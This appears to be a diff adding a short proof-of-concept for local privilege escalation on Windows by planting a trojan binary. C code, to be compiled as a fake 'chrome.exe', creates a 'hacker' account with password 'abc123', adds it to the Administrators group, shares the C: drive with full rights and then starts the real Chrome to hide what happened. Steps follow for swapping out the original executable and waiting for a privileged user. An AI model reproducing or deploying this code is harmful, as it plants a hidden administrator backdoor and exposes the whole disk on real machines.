@@ -1,0 +1,20 @@
+#Twitter.com/ClumsyLulz
+#PoC By Taylor Christian Newsome 
+=================
+ 
+1) Compile below 'C' code name it as "chrome.exe"
+ 
+#include<windows.h>
+ 
+int main(void){
+ system("net user hacker abc123 /add");
+ system("net localgroup Administrators hacker  /add");
+ system("net share SHARE_NAME=c:\ /grant:hacker,full");
+ WinExec("C:\\Program Files\\Google\Chrome\Application\\chrome.exe",0);
+return 0;
+} 
+ 
+2) Rename original "chrome.exe" to "~chrome.exe"
+3) Place our malicious "chrome.exe" in the Chrome>Application directory
+4) Disconnect and wait for a more privileged user to connect and use Powershell IDE. 
+Privilege Successful Escalation
